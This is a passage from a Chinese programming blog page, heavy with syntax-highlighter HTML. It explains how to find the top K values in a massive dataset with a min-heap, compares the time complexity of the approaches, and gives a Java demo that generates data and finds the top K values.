class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{a=0, b=101, c=100, d=111, e=1101, f=1100}\r\n010110001011001101110011011100110111001101010110011110111011011100101110110111001010101100</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b4507849861-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b4507849861-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b4507849861-1\"><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">101</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">111</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1101</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1100</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b4507849861-2\"><span class=\"crayon-cn\">010110001011001101110011011100110111001101010110011110111011011100101110110111001010101100</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h2 id=\"4-堆的应用：海量实数中（一亿级别以上）找到TopK（一万级别以下）的数集合。\">4 堆的应用：海量实数中（一亿级别以上）找到TopK（一万级别以下）的数集合。</h2>\n<ul>\n<li>A:通常遇到找一个集合中的TopK问题，想到的便是排序，因为常见的排序算法例如快排算是比较快了，然后再取出K个TopK数，时间复杂度为<code>O(nlogn)</code>，当<code>n</code>很大的时候这个时间复杂度还是很大的；</li>\n<li>B:另一种思路就是打擂台的方式,每个元素与K个待选元素比较一次，时间复杂度很高：<code>O(k*n)</code>，此方案明显逊色于前者。</li>\n</ul>\n<p>对于一亿数据来说，A方案大约是<code>26.575424*n</code>；</p>\n<ul>\n<li>C:由于我们只需要TopK，因此不需要对所有数据进行排序，可以利用堆得思想，维护一个大小为K的小顶堆，然后依次遍历每个元素<code>e</code>, 若元素<code>e</code>大于堆顶元素<code>root</code>，则删除<code>root</code>，将<code>e</code>放在堆顶，然后调整，时间复杂度为<code>logK</code>；若小于或等于，则考察下一个元素。这样遍历一遍后，最小堆里面保留的数就是我们要找的<code>topK</code>，整体时间复杂度为<code>O(k+n*logk)</code>约等于<code>O(n*logk)</code>，大约是<code>13.287712*n</code>（由于k与n数量级差太多），这样时间复杂度下降了约一半。</li>\n</ul>\n<p>A、B、C三个方案中，C通常是优于B的，因为logK通常是小于k的，当<code>K</code>和<code>n</code>的数量级相差越大，这种方式越有效。</p>\n<p>以下为具体操作：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a7b9270327051\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport java.io.File;\r\nimport java.io.FileNotFoundException;\r\nimport java.io.PrintWriter;\r\nimport java.io.UnsupportedEncodingException;\r\nimport java.util.Arrays;\r\nimport java.util.Scanner;\r\nimport java.util.Set;\r\nimport java.util.TreeSet;\r\npublic class TopKNumbersInMassiveNumbersDemo {\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tint[] topK = new int[]{50001,50002,50003,50004,50005};\r\n\t\tgenData(1000 * 1000 * 1000, 500, topK);\r\n\t\tlong t = System.currentTimeMillis();\r\n\t\tfindTopK(topK.length);\r\n\t\tSystem.out.println(String.format(\"cost:%fs\", (System.currentTimeMillis() - t) * 1.0 / 1000));\r\n\t}\r\n\t\r\n\tpublic static void genData(int N, int maxRandomNumer, int[] topK) {\r\n\t\tFile f = new File(\"data.txt\");\r\n\t\tint k = topK.length;\r\n\t\tSet&lt;Integer&gt; index = new TreeSet&lt;&gt;();\r\n\t\tfor (;;) {\r\n\t\t\tindex.add((int)(Math.random() * N));\r\n\t\t\tif (index.size() == k)\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t\tSystem.out.println(index);\r\n\t\tint j = 0;\r\n\t\ttry {\r\n\t\t\tPrintWriter pW = new PrintWriter(f, \"UTF-8\");\r\n\t\t\tfor (int i = 0; i &lt; N; i++)\r\n\t\t\t\tif(!index.contains(i))\r\n\t\t\t\t\tpW.println((int)(Math.random() * maxRandomNumer));\r\n\t\t\t\telse\r\n\t\t\t\t\tpW.println(topK[j++]);\r\n\t\t\tpW.flush();\r\n\t\t} catch (FileNotFoundException e) {\r\n\t\t\t// TODO Auto-generated catch block\r\n\t\t\te.printStackTrace();\r\n\t\t} catch (UnsupportedEncodingException e) {\r\n\t\t\t// TODO Auto-generated catch block\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t}\r\n\t\r\n\tpublic static void findTopK(int k) {\r\n\t\tint[] nums = new int[k];\r\n\t\t//read\r\n\t\tFile f = new File(\"data.txt\");\r\n\t\ttry {\r\n\t\t\tScanner scanner = new Scanner(f);\r\n\t\t\tfor (int j = 0;j &lt; k; j++)\r\n\t\t\t\tnums[j] = scanner.nextInt();\r\n\t\t\theapify(nums);\r\n\t\t\t//core\r\n\t\t\twhile (scanner.hasNextInt()) {\r\n\t\t\t\tint a = scanner.nextInt();\r\n\t\t\t\tif (a &lt;= nums[0])\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\telse {\r\n\t\t\t\t\tnums[0] = a;\r\n\t\t\t\t\tsiftDown(0, k, nums);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tSystem.out.println(Arrays.toString(nums));\r\n\t\t} catch (FileNotFoundException e) {\r\n\t\t\t// TODO Auto-generated catch block\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t}\r\n\t\r\n\t//O(n), minimal heap\r\n\tpublic static void heapify(int[] nums) {\r\n\t\tint size = nums.length;\r\n\t\tfor (int j = (size - 1) &gt;&gt; 1; j &gt;= 0; j--)\r\n\t\t\tsiftDown(j, size, nums);\r\n\t}\r\n\t\r\n\tprivate static void siftDown(int i, int n, int[] nums) {\r\n\t\tint key = nums[i];\r\n\t\tfor (;i &lt; (n &gt;&gt;&gt; 1);) {\r\n\t\t\tint child = (i &lt;&lt; 1) + 1;\r\n\t\t\tif (child + 1 &lt; n &amp;&amp; nums[child] &gt; nums[child+1])\r\n\t\t\t\tchild++;\r\n\t\t\tif (key &lt;= nums[child])\r\n\t\t\t\tbreak;\r\n\t\t\tnums[i] = nums[child];\r\n\t\t\ti = child;\r\n\t\t}\r\n\t\tnums[i] = key;\r\n\t}\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7b9270327051-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7b9270327051-95\">95</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">File</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FileNotFoundException</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PrintWriter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UnsupportedEncodingException</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Arrays</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Scanner</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-7\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Set</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-8\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TreeSet</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-9\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TopKNumbersInMassiveNumbersDemo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-12\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// TODO Auto-generated method stub</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-13\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">topK</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">50001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">50002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">50003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">50004</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">50005</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-14\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">genData</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">500</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">topK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-15\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-16\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">findTopK</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">topK</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-17\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">format</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"cost:%fs\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-18\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-19\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-20\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">genData</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxRandomNumer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">topK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-21\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">File</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"data.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-22\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">topK</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-23\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">Set</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TreeSet</span><span class=\"crayon-o\">&lt;&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span 